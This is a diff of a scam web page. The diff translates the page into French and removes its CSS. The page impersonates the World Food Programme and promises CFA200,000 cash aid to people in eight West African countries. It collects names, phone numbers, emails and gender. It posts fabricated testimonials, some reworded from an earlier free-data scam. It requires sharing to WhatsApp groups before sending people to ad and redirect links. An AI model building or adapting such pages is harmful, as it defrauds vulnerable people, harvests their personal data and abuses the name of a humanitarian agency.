@@ -37,7 +37,7 @@
         <title>World Food Programme</title>
         <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
         <meta name="og:title" content="World Food Programme" />
-        <meta property="og:description" content="CFA200,000 Government Poverty Alleviation Subsidy" />
+        <meta property="og:description" content="CFA200,000 Programme alimentaire mondial - Fournir une aide en espèces" />
         <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgqX8KbyMaxZkecyYKce2mXpn_Pm9HfWqwaAzZtudM8LC_gq_LV72HF-cEsbusbcGopzdaN5Lb9oQkgBalaoVzlykN400n8dM5ezo_qwDIv67tfOFBenc6tT0nIwNeSTahD8f2DUM8C1xeaLp2CAmEye8w1drQY6baKMffoKnGFJx28tcfLG57zdseAMIV3/s320/763B4CC4-5FB5-4E99-B046-03C1A34528CF.jpeg" />
         <meta property="og:type" content="website" />
     <meta property="og:updated_time" content="1440432930" />
@@ -74,266 +74,7 @@
   }
 }
 </style>
-<style type="text/css">
-@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
-@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
-* {
-    margin: 0;
-    padding: 0;
-    font-family: Poppins, Droid Arabic Naskh;
-    font-weight: normal;
-    box-sizing: border-box;
 
-
-}
-body {
-    direction: lfl;
-    background: #E8B36F;
-}
-a {
-    text-decoration: none;
-}
-.post {
-    background: #FAF5EB;
-    margin: 0 auto;
-    padding: 10px;
-    max-width: 500px;
-    border: 1px solid #d0d1d5;
-    border-radius: 3px;
-}
-.post img {
-    width: 100%;
-}
-.welcome {
-    font-size: 15px;
-}
-.amount,
-#getname {
-    color: #ffffff;
-    text-decoration: none;
-}
-.done {
-    text-align: center;
-    color: #27ae60;
-}
-.tip {
-    font-size: 14px;
-}
-.title {
-    text-align: center;
-}
-.error {
-    display: none;
-    text-align: center;
-    font-size: 14px;
-    color: #e74c3c;
-}
-button {
-    display: block;
-    width: 200px;
-    height: 50px;
-    color: #fff;
-    border: none;
-    outline: none;
-    font-size: 24px;
-    cursor: pointer;
-    border-radius: 5px;
-    padding: 0 10px;
-    margin: 10px auto;
-    background: rgb(0, 0, 0);
-    transition: background 0.3s ease;
-}
-button:hover {
-    background: #000000;
-}
-.phone {
-    max-width: 400px;
-    margin: 10px auto;
-}
-.phone input {
-    width: 100%;
-    height: 50px;
-    padding: 10px;
-    outline: none;
-    border: 2px solid #cecece;
-    font-size: 14px;
-}
-#confirm {
-    width: 200px;
-    margin: 10px auto;
-    border-radius: 0px;
-}
-#loader {
-    text-align: center;
-}
-.spin {
-    width: 50px;
-    height: 50px;
-    background: transparent;
-    border: solid 8px rgb(0, 0, 0);
-    border-right-color: transparent;
-    border-radius: 50%;
-    margin: 10px auto;
-    animation: spin 0.8s linear infinite;
-}
-@keyframes spin {
-    100% {
-        transform: rotate(1turn);
-    }
-}
-#loader,
-#info,
-#checking,
-#share,
-#claim {
-    display: none;
-}
-.center {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-.barr {
-    direction: ltr;
-    max-width: 400px;
-    margin: 10px auto;
-    box-sizing: border-box;
-}
-.fill {
-    position: relative;
-    display: inline-block;
-    width: calc(100% - 100px);
-    height: 35px;
-    padding: 2px;
-    border: 2px solid #FAF5EB;
-}
-#fill,
-#fill2 {
-    background: #FAF5EB;
-    width: 0%;
-    height: 100%;
-}
-.percentage {
-    width: 100px;
-    float: right;
-    height: 35px;
-    font-size: 16px;
-    border: 2px solid #FAF5EB;
-}
-#percentage,
-#percentage2 {
-    margin-left: 5px;
-}
-#check,
-#check2 {
-    display: none;
-}
-.counter {
-    color: #7f7f7f;
-    font-size: 12px;
-    text-align: right;
-    padding: 10px 0 10px 2px;
-    border-bottom: 1px solid #ffffff;
-}
-.reactions {
-    display: inline-flex;
-    align-items: center;
-    float: left;
-}
-.counter img {
-    float: left;
-    width: 16px;
-    height: 16px;
-    border-radius: 50%;
-    border: 2px solid #000000;
-    box-sizing: content-box;
-}
-.like,
-.love {
-    margin-right: -5px;
-}
-.like {
-    z-index: 2;
-}
-.love {
-    z-index: 1;
-}
-.bar {
-    display: table;
-    width: 100%;
-    border-bottom: 1px solid #000000;
-}
-.bar .react {
-    display: table-cell;
-    width: calc(100% / 3);
-    font-size: 12px;
-    color: #000000;
-    text-align: center;
-    padding: 10px 0;
-    cursor: pointer;
-}
-.comments {
-    direction: ltr;
-}
-.comment {
-    padding: 6px 0;
-    margin-top: 5px;
-}
-.comment img {
-    float: left;
-    width: 32px;
-    height: 32px;
-    border: none;
-    border-radius: 18px;
-    cursor: pointer;
-}
-.reply {
-    margin-left: 37px;
-}
-.single-container {
-    margin-left: 37px;
-    background: #FAF5EB;
-    padding: 10px;
-    border-radius: 15px;
-    font-size: 12px;
-}
-.single-container .user {
-    display: inline-block;
-    cursor: pointer;
-    color: #365899;
-    margin-bottom: 5px;
-}
-.single-container .text {
-    display: block;
-}
-.buttons {
-    font-size: 12px;
-    font-weight: bold;
-    margin: 10px 0 0 47px;
-    color: #000000;
-}
-.action {
-    cursor: pointer;
-}
-.action:hover {
-    text-decoration: underline;
-}
-.input {
-    padding: 6px 12px 12px;
-}
-.input input {
-    width: 100%;
-    background: #f1f2f6;
-    padding: 10px;
-    border-radius: 15px;
-    border: 0;
-    outline: none;
-}
-.A{
-    text-align: center;
-    background-color: rgb(250, 245, 235);
-}
-</style>
   
   
   
@@ -346,7 +87,7 @@ button:hover {
 
   
                         <div class="A">
-                        <font color="black">CFA200,000 Government Poverty Alleviation Subsidy </font><br/><font color="red"><font clor="red">Eligible Countries:</font> Benin, Burkina Faso, Côte d'Ivoire, Guinea-Bissau, Mali, Niger, Senegal, Togo</font>
+                        <font color="black">CFA200,000 World Food Programme aide en espèces </font><br/><font color="red"><font clor="red">pays éligibles:</font> Benin, Burkina Faso, Côte d'Ivoire, Guinea-Bissau, Mali, Niger, Senegal, Togo</font>
          </div>
     <div class="post" width="100%">
 
@@ -360,19 +101,19 @@ button:hover {
            
                  
            
-              <center><p class="title"><font color="black">Fill Form Below:</font></p></center>
-              <center><input type="char" placeholder="enter full name" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/> 
+              <center><p class="title"><font color="black">Remplissez le formulaire ci-dessous:</font></p></center>
+              <center><input type="char" placeholder="entrez le nom complet" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/> 
               
-              <center><input type="char" placeholder="enter mobile number" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/> 
+              <center><input type="char" placeholder="entrez le numéro de portable" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/> 
               
-              <center><input type="char" placeholder="enter e-mail" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/> 
+              <center><input type="char" placeholder="entrez votre adresse e-mail" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/> 
                
           
                
-            <button id="go">SEND ➤</button>
+            <button id="go">ENVOYER ➤</button>
         </div>
         <div id="loader">
-            <div>Checking your information...</div>
+            <div>Vérification de vos informations...</div>
             <div class="spin"></div>
             <div id="num">0%</div>
         </div>
@@ -385,21 +126,21 @@ button:hover {
     width: 330px;
     height: 56px;
 ">
-<option value="أختر نوع الشبكة" selected="1">---Choose your Gender---</option>
-  <option value="1">Male</option>
-<option value="2">Female </option>
+<option value="أختر نوع الشبكة" selected="1">---Choisissez votre genre---</option>
+  <option value="1">Mâle</option>
+<option value="2">Femelle </option>
 
   
 
   
 </select>
 </center><br>
-          <button id="confirm">Proceed</button>
+          <button id="confirm">Processus</button>
           
           
           
             </div>
-            <p class="error">Sorry, Your Full Name is Missing <a href="https://sa-monthly-free-data.blogspot.com/#1692813165548"> <b><font color="#14948F">ADD NUMBER</font></b></a></p>
+            <p class="error">Désolé, votre nom complet est manquant <a href="https://free-gb-data.org/hilda.html"> <b><font color="#14948F">ADD NUMBER</font></b></a></p>
         </div>
         <div id="checking">
           <p class="title"><font color="#000000">Processing your CFA200,000...</font></p>
@@ -416,13 +157,13 @@ button:hover {
         </div>
         <div id="share">
 
-          <p class="tip"> <font color="#000000">Congratulations, </font> <span id="getname"></span>،</p>
+          <p class="tip"> <font color="#000000">Toutes nos félicitations, </font> <span id="getname"></span>،</p>
             <p class="tip">
-              <font color="#000000"> you have been sellected to receive CFA200,000 Government Poverty Alleviation Subsidy </font><span class="amount"> Proceed to fill transfer form</span><br>
-              <font color="#000000">How to proceed:</font>
+              <font color="#000000"> you have been selected to receive CFA200,000 de l'aide en espèces du Programme alimentaire mondial </font><span class="amount"> Continuer à remplir le formulaire de transfert</span><br>
+              <font color="#000000">La façon de procéder:</font>
             </p><br><font color="#000000">
-            <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
-            <p class="tip">2. You will be redirected automatically to our "TRANSFER FORM" page after the verification bar is filled.</p>
+            <p class="tip">1. Partagez-le avec 5 groupes ou 15 amis sur WhatsApp (Cliquez sur l'icône "PARTAGER" ci-dessous).</p>
+            <p class="tip">2. Vous serez automatiquement redirigé vers notre page "FORMULAIRE DE TRANSFERT" une fois la barre de vérification remplie.</p>
           </font>
 <center>
             <button id="whatsapp">
@@ -434,7 +175,7 @@ button:hover {
   behavior="alternate"
   style="border:solid"/>
     
-              SHARE</button></center>
+              PARTAGER</button></center>
             <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -447,13 +188,13 @@ button:hover {
         </div>
         <div id="claim">
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
-            <p class="title"> <font color="#E39A06">Click "TRANSFER FORM" Below to get your Government CFA200,000 Poverty Alleviation Subsidy </font> </p>
+            <p class="title"> <font color="#E39A06">Cliquez sur "FORMULAIRE DE TRANSFERT" ci-dessous pour obtenir votre aide en espèces de 200 000 FCFA du Programme Alimentaire Mondial.</font> </p>
            <br/>
           <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://bit.ly/uguh9wusjvjsj" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow"><div width="300"
   height="40"
   behavior="alternate"
-  style="border:solid"/>TRANSFER FORM</font></button>
+  style="border:solid"/>FORMULAIRE DE TRANSFERT</font></button>
                     </a><br/>
           
       
@@ -462,9 +203,9 @@ button:hover {
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow"><div width="300"
   height="40"
   behavior="alternate"
-  style="border:solid"/>REPORT ISSUE</font></button>
+  style="border:solid"/>RAPPORT DE NUMÉRO</font></button>
                     </a><br/>
-            <button id="offer">BANK</button><br/>
+            <button id="offer">BANQUE</button><br/>
              
              
           
@@ -489,14 +230,14 @@ button:hover {
                     <div class="single-container">
                         <span class="user"> Spaizo Wa le Sele </span>
                         <span class="text"> 
-                        I doubt this offer at first, but it's real. i just got my 10GB am using MTN.
+                        I doubt this offer at first, but it's real. i just got CFA200,000 .
                         </span>
                     </div>
                     <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
                 </div>
                 <div class="comment">
                     <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWy1COZLK5LlQoJ3ucT0Qwx0yZsD55ZJNhKXS4l0NJL3K7f4nL63ZdmgMd51PqATe1splWaPaV774ewsmdCSite6unt_386PzUHY3w4EM8KIJw_dsu2J7rJiFboh1HAJPVZ6tYaxYcnlf__g5PAbXPe7jUrYWIHYFvGOAVxWCFwv77H5Nw85KYsLq2XMVl/s320/415FAF68-B78A-4ED6-B1BB-D12C862ED3B7.jpeg" />
-                    <div class="single-container"><span class="user">Abraham Modric</span> <span class="text"> I just received 10GB  wow unbeleivable.  </span></div>
+                    <div class="single-container"><span class="user">Abraham Modric</span> <span class="text"> Je viens de recevoir mon argent maintenant... wow incroyable.  </span></div>
                     <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
                 </div>
                 <div class="comment reply">
@@ -616,7 +357,7 @@ $(document).click(function () {
 "*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
 -->
      <script>
-        var text1 = "*World Food Programme*%0A%0A_Government CFA200,000 Poverty Alleviation Subsidy_%0A%0A*Eligible Countries:* Benin, Burkina Faso, Côte d'Ivoire, Guinea-Bissau, Mali, Niger, Senegal, Togo%0A%0ARegister Here👇👇%0Ahttps://free-gb-data.org/hilda.html",
+        var text1 = "*World Food Programme CFA200,000 aide en espèces*%0A%0A_World Food Programme - Fournir une aide en espèces à CFA200,000_%0A%0A*Pays éligibles:* Benin, Burkina Faso, Côte d'Ivoire, Guinea-Bissau, Mali, Niger, Senegal, Togo%0A%0AInscrivez-vous ici👇👇%0Ahttps://free-gb-data.org/hilda.html",
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
